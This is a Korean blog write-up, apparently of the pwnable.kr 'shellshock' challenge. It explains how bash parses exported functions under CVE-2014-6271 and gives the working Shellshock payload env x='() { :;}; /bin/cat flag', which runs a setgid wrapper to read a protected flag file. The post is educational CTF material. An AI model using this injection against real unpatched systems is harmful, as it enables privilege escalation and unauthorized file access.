---
title: "pwnable.kr - Toddler's bottle #9 shellshock"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #9 shellshock 문제 풀이

Shellshock 라는 CVE-2014-6271를 사용하는 문제이다
Bash shell에 40년동안 존재해온 취약점이라고 한다. ㅎㄷㄷ

Bash는 환경변수를 만들수 있다
~~~
shellshock@pwnable:~$ zxcv=333
shellshock@pwnable:~$ echo $zxcv
333
shellshock@pwnable:~$ env | grep zxcv
shellshock@pwnable:~$
~~~

그런데 위와 같이 하면 local variable로 세팅되서 현재 bash에서만 사용할 수 있다. 그래서 env명령에서도 안나온다

sub-process에서도 해당 variable을 사용하게 하려면 export를 사용해야 한다

~~~
shellshock@pwnable:~$ export zxcv=333
shellshock@pwnable:~$ echo $zxcv
333
shellshock@pwnable:~$ env | grep zxcv
zxcv=333
shellshock@pwnable:~$ bash
shellshock@pwnable:~$ echo $zxcv
333
shellshock@pwnable:~$ exit
exit
shellshock@pwnable:~$
~~~

bash는 환경변수로 함수를 만들 수도 있다 이런식으로
~~~
shellshock@pwnable:~$ foo() { echo hello; }
shellshock@pwnable:~$ foo
hello
~~~

함수를 만들때는 스페이스바를 잘 넣어야 한다 (bracket 주의)
~~~
shellshock@pwnable:~$ foo() {echo hello;}
-bash: syntax error near unexpected token `{echo'
~~~

Bash의 동작 순서는 이렇다 (https://operatingsystems.tistory.com/entry/Shellshock-CVE20146271)
~~~
# Bash Process 동작 순서
a. Bash 실행
b. Bash 환경변수 초기화
c. Bash shell prompt 출력
d. 명령어 기다림
e. (명령어를 수행할 경우) 명령어를 문자열로 저장하여 해당 문자열 parsing 수행
f. parsing된 구조체를 이용하여 명령어 수행
~~~

CVE-2014-6271 은 b. Bash 환경변수 초기화에 있는 문제이다

아래와 같이 넣었을때 vulnerable이라고 뜨면 그 bash는 취약한 것이다
~~~
​env x='() { :;}; echo vulnerable' bash -c "echo test"
~~~

저게 원래 해야 하는 일은 x에 '() { :;}; echo vulnerable' string을 넣고 난 다음 env에 x가 등록된 환경에서 bash -c "echo test" 하는거다. 정상적인 용례는 이렇다

~~~
vmware@ubuntu:~$ env zxcv='9999' bash -c "env | grep zxcv"
zxcv=9999
vmware@ubuntu:~$ env | grep zxcv

vmware@ubuntu:~$
~~~

참고로 `env | grep zxcv` 안하고 그냥 echo zxcv 하면 아무것도 안뜬다... 왜냐하면 shell은 getenv/setenv/putenv 잘 안쓰고 자기들이 자체적으로 가져오기 때문이다. 안에서도 제대로 가져오도록 하려면 export로 등록해야 한다

변수로 등록했는데 함수처럼 쓸수 있다. 다시 말해 export로 등록했는데 함수처럼 쓸수 있다. 그래서 이런게 가능하다

다시 이걸로 돌아와서
~~~
​env x='() { :;}; echo vulnerable' bash -c "echo test"
~~~

취약한 shell은 이렇게 뜬다
~~~
shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./bash -c "echo test"
vulnerable
test
~~~
./bash 한 이유는 shellshock의 local에 있는 bash만 vulnerable 하니까...
vulnerable은 parent shell이 아니라 ./bash -c로 실행된 child bash에서 실행된거다. 다시 말해 bash가 뜨자마자 echo vulnerable을 해주고 나서 echo test해 준 것이다

**취약점의 핵심은 이와 같이 변수로 지정된 환경변수가 shell실행시 함수로 해석되어 초기화 될때 실행이 된다는 점이다**

env help를 보면 이렇게 되어 있다
~~~
shellshock@pwnable:~$ env --help
Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
Set each NAME to VALUE in the environment and run COMMAND.

Mandatory arguments to long options are mandatory for short options too.
  -i, --ignore-environment  start with an empty environment
  -0, --null           end each output line with NUL, not newline
  -u, --unset=NAME     remove variable from the environment
      --help     display this help and exit
      --version  output version information and exit

A mere - implies -i.  If no COMMAND, print the resulting environment.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/env>
or available locally via: info '(coreutils) env invocation'
~~~

그러므로 
~~~
env x='() { :;}; /bin/cat flag' ./shellshock
~~~

이렇게 하면 환경변수 x에 '() { :;}; /bin/cat flag' 이 저장되는데, 이 환경변수를 가지고 실행되는 bash는 이것을 함수로 해석하여 초기화 할때 실행시켜준다.

shellshock를 보면 이렇게 생겼다
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

즉 bash 실행시 초기화 과정에서 함수로 실행될 취약점이 있는 상태에서, 고맙게도 setresuid, setresgid하고 system을 통해 "/home/shellshock/bash -c 'echo shock_me'" 를 해 주는거다.

요점은 취약점을 공략하는 환경변수가 등록된 채 setgid를 걸고 bash를 실행시킨다는 것

결과는 이렇다
~~~
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
<tag output>
Segmentation fault (core dumped)
~~~

Segmentation fault가 왜 나는지는 잘 모르겠다...

[pwnable.kr]: https://pwnable.kr

<!-- only if I knew CVE-2014-6271 ten years ago..!! -->